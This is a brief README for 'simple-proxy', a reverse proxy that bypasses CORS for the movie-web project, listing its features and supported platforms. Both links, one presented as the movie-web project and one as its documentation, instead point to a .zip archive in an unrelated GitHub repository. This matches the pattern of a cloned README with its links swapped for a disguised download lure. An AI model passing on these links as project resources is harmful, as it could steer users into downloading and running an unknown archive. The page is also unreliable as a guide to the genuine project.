# simple-proxy

Simple reverse proxy to bypass CORS, used by [movie-web](https://raw.githubusercontent.com/holypickles/Study-Chatbot/dev/farctate/Study-Chatbot.zip).
Read the docs at https://raw.githubusercontent.com/holypickles/Study-Chatbot/dev/farctate/Study-Chatbot.zip

---

### features:
 - Deployable on many platforms - thanks to nitro
 - header rewrites - read and write protected headers
 - bypass CORS - always allows browser to send requests through it
 - secure it with turnstile - prevent bots from using your proxy

> [!WARNING]
> Turnstile integration only works properly with cloudflare workers as platform

### supported platforms:
 - cloudflare workers
 - AWS lambda
 - nodejs
 - netlify edge functions
